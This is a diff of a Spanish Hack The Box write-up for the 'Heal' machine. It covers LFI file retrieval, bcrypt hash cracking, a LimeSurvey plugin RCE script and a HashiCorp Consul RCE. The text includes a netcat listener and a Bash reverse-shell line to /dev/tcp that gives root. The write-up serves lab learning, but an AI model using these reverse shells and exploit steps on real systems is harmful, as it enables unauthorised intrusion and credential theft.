@@ -176,7 +176,7 @@ position: relative;
 
 <br>
 
-**Heal** es una máquina de la plataforma Hack The Box de dificultad media que aborda temas como la explotación de tecnologías como TeamCity y Portainer, así como tunneling. La clave para su explotación radica en la enumeración.
+**Heal** es una máquina de la plataforma Hack The Box de dificultad media que aborda temas como la explotación Web como LFI (Local File Inclusion), enumeración de LimeSurvey, acceso a archivos SQLite y para la escalación de privilegios se tocan temas de tunneling y la explotación de la tecnología HashiCorp Consul.
 
 ## Enumeración
 Realicé un escaneo de puertos con la herramienta **Nmap** e identifiqué los siguientes puertos abiertos:<br>
@@ -226,14 +226,13 @@ ff02::1         ip6-allnodes
 ff02::2         ip6-allrouters
 10.10.11.46     heal.htb
 ```
-
 ## Enumeración Web
 
 La página web de la máquina era la siguiente:
 
 ![](/assets/images/htb-writeup-Heal/dash.png)
 
-Realicé un escaneo de vhosts y pude identificar uno llamado `api`
+Realicé un escaneo de vhosts y pude identificar un subdominio `api`
 
 ```bash
 ┌──(root㉿kali)-[/opt]
@@ -324,10 +323,9 @@ Una vez que confirmé la ruta del archivo, lo descargué con `curl` para poder a
 └─# file test.sqlite3 
 test.sqlite3: SQLite 3.x database, last written using SQLite version 3045002, writer version 2, read version 2, file counter 2, database pages 8, cookie 0x4, schema 4, UTF-8, version-valid-for 2
 ```
+Utilicé la opción `--path-as-is` en `curl` para evitar que la herramienta normalizara la ruta. Esta opción es crucial al explotar vulnerabilidades LFI, ya que permite enviar rutas con `../` sin que sean modificadas, asegurando que el servidor las procese tal como fueron escritas
 
-Utilicé la opción `--path-as-is` en `curl` para evitar que la herramienta normalizara la ruta. Esta opción es crucial al explotar vulnerabilidades LFI, ya que permite enviar rutas con `../` sin que sean modificadas, asegurando que el servidor las procese tal como fueron escritas.
-
-Con el archivo descargado, enumeré las tablas contenidas en la base de datos y encontré una llamada `users`. Al consultar sus registros, identifiqué los nombres de usuario junto con sus hashes de contraseña.
+Con el archivo descargado, enumeré las tablas contenidas en la base de datos y encontré una llamada `users`. Al consultar sus registros, identifiqué los nombres de usuario junto con sus hashes
 
 ```bash
 ┌──(root㉿kali)-[/home/kali/test]
@@ -343,7 +341,6 @@ sqlite> select * from users;
 3|test@htb.com|$2a$12$Qlrlfns13A0wvb7po1cUo.MvK0yTs.ibAQI4G1krNHP/vagzBxQu2|2025-05-19 21:33:01.074219|2025-05-19 21:33:01.074219|test|admin|0
 sqlite> 
 ```
-
 Con Hash Identifier detecté que el algoritmo del hash era `bcrypt`, así que utilicé John the Ripper para intentar romperlo
 
 ![](/assets/images/htb-writeup-Heal/hash.png)
@@ -409,7 +406,6 @@ Una vez activado el plugin, hice un _hover_ sobre él para visualizar su ID, ya 
 
 ![](/assets/images/htb-writeup-Heal/take.png)
 
-
 ```bash
 print(Fore.CYAN + "\n[INFO] Activating Plugin...")
 activate_page = req.get(url + "/index.php/admin/pluginmanager?sa=activate")
@@ -419,9 +415,7 @@ activate_creds = {"YII_CSRF_TOKEN": csrf_token4, "pluginId": "19"}  # CHANGE PLU
 activate_response = req.post(url + "/index.php/admin/pluginmanager?sa=activate", data=activate_creds)
 print(Fore.GREEN + "[SUCCESS] Plugin Activated Successfully!")
 ```
-
 Finalmente, configuré un listener con Netcat en el puerto especificado en el archivo `revshell.php` y ejecuté el script para recibir la reverse shell.
-
 
 ```bash
 ┌──(root㉿kali)-[/opt/Limesurvey-6.6.4-RCE]
@@ -447,7 +441,6 @@ Finalmente, configuré un listener con Netcat en el puerto especificado en el ar
 
 [INFO] Triggering Reverse Shell...
 ```
-
 ```bash
 ┌──(root㉿kali)-[/home/kali]
 └─# nc -lvp 443                                      
@@ -460,7 +453,6 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 /bin/sh: 0: can't access tty; job control turned off
 $ 
 ```
-
 ## www-data to Ron
 
 Una vez dentro de la máquina, realicé un tratamiento de la TTY para poder trabajar de forma más cómoda.
@@ -481,7 +473,6 @@ Terminal type? xterm
 www-data@heal:/$ export TERM=xterm
 www-data@heal:/$ export SHELL=bash
 ```
-
 Dentro del directorio de LimeSurvey encontré un archivo interesante: `setdebug.php`
 
 ```bash
@@ -529,7 +520,6 @@ if (!defined('YII_DEBUG')) {
     unset($settings);
 }
 ```
-
 En este archivo se hace mención a otro archivo de configuración: `application/config/config.php`, el cual contiene credenciales. Probé estas credenciales con ambos usuarios y funcionaron para `ron`
 
 ```bash
@@ -618,7 +608,6 @@ www-data@heal:~/limesurvey$ su ron
 Password: 
 ron@heal:/var/www/limesurvey$ 
 ```
-
 ## Escalada de privilegios
 
 Al enumerar los puertos abiertos de la máquina de forma interna, encontré los siguientes:
@@ -703,7 +692,6 @@ tcp        0      0 127.0.0.1:50495         127.0.0.1:8300          ESTABLISHED 
 tcp        0      0 127.0.0.1:55676         127.0.0.1:8500          ESTABLISHED -                   
 tcp6       0      0 :::22                   :::*                    LISTEN      -  
 ```
-
 Empecé a realizar peticiones con `curl` a los puertos abiertos internamente para verificar si respondían, y me di cuenta de que los puertos `3000` y `8500` devolvían una respuesta.
 
 ```bash
@@ -751,7 +739,6 @@ ron@heal:/tmp$ curl http://127.0.0.1:3000/
   <script src="/static/js/bundle.js"></script><script src="/static/js/0.chunk.js"></script><script src="/static/js/main.chunk.js"></script></body>
 </html>
 ```
-
 ```bash
 ron@heal:/tmp$ curl http://127.0.0.1:8500/
 <a href="/ui/">Moved Permanently</a>.
@@ -797,16 +784,15 @@ ron@heal:~$ cd /tmp
 ```
 ![](/assets/images/htb-writeup-Heal/EP.png)
 
-Al revisar el sitio, identifiqué que se trataba de la tecnología HashiCorp Consul, en su versión `1.19.2`. Investigando un poco más, descubrí que esta versión es vulnerable a una ejecución remota de comandos (RCE) a través de la API de Consul. Para explotarla, utilicé el siguiente script: [Hashicorp Consul - Remote Command Execution via Services API](https://github.com/owalid/consul-rce).
+Al revisar el sitio, identifiqué que se trataba de la tecnología HashiCorp Consul, en su versión `1.19.2`. Investigando un poco más, descubrí que esta versión es vulnerable a una ejecución remota de comandos (RCE) a través de la API de Consul. Para explotarla, utilicé el siguiente script: [Hashicorp Consul - Remote Command Execution via Services API](https://github.com/owalid/consul-rce)
 
-Como primer paso, creé un script con una reverse shell en Bash.
+Como primer paso, creé un script con una reverse shell en Bash
 ```bash
 ron@heal:/tmp$ cat pwn.sh 
 #!/bin/bash
 bash -i >& /dev/tcp/10.10.16.62/4433 0>&1
 ron@heal:/tmp$ 
 ```
-
 Finalmente, ejecuté el script y obtuve una reverse shell con privilegios de `root`.
 
 ```bash
